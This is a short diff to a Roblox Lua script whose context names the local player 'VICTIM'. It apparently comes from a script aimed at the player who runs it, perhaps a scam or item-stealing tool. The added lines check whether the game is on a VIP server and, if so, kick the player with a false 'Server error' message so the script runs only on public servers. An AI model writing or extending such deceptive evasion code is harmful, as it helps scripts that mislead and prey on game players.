@@ -15,6 +15,17 @@ return
 end
 _G.scriptExecuted = true
 
+local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
+if getServerType and getServerType:IsA("RemoteFunction") then
+local ok, serverType = pcall(function()
+return getServerType:InvokeServer()
+end)
+if ok and serverType == "VIPServer" then
+plr:Kick("Server error. Please join a DIFFERENT server")
+return
+end
+end
+
 -- 🛠️ Services & Variables
 repeat task.wait() until game:IsLoaded()
 local VICTIM = game.Players.LocalPlayer
